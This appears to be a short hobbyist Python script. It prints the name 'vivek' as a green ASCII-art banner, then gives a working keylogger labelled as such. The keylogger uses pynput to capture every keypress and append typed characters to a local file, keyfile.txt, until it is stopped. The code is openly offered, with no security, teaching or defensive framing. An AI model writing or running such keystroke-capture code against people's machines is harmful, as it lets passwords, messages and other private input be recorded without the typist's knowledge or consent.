import pyfiglet
from termcolor import colored

# Text to convert to ASCII art
text = "vivek"


# Specify font
font = "big"

# Generate ASCII art with specified font
ascii_art = pyfiglet.figlet_format(text, font=font)

# Color the ASCII art
colored_ascii_art = colored(ascii_art, color='green')

# Print the colored ASCII art
print(colored_ascii_art)

#keylogger in python 

from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            print("error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    listener.join()  # This keeps the listener running until you stop it explicitly
